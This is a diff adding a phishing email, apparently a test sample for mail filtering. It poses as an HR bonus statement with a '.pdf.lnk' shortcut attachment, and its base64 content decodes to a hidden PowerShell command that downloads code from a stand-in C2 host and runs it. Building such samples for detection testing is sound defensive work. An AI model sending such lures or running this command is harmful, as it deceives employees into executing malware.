@@ -1,0 +1,24 @@
+From: "Human Resources" <hr@internal-benefits-payroll.com>
+To: victim@company.com
+Subject: Annual Compensation Review & Bonus Allocation.pdf.lnk
+Return-Path: <hr@internal-benefits-payroll.com>
+Reply-To: <hr@internal-benefits-payroll.com>
+Date: Fri, 16 Oct 2026 15:30:00 +0000
+Message-ID: <test-09-2026@mail-gateway.org>
+Authentication-Results: mx.company.com; spf=none dkim=none dmarc=none
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============BOUNDARY_PHISH_73_09=="
+
+--===============BOUNDARY_PHISH_73_09==
+Content-Type: text/html; charset=utf-8
+
+Attached is your annual bonus allocation statement. Double click the PDF icon to view.
+
+--===============BOUNDARY_PHISH_73_09==
+Content-Type: application/x-ms-shortcut; name="Bonus_Statement_2025.pdf.lnk"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Bonus_Statement_2025.pdf.lnk"
+
+TAAAAAEUAgAAAAAAwAAAAAAAAEZwb3dlcnNoZWxsLmV4ZSAtd2luZG93c3R5bGUgaGlkZGVuIChjdXJsIGh0dHA6Ly9jMi5iYWQub3JnL2xvYWQuYmluIHwgaWV4KQ==
+
+--===============BOUNDARY_PHISH_73_09==--
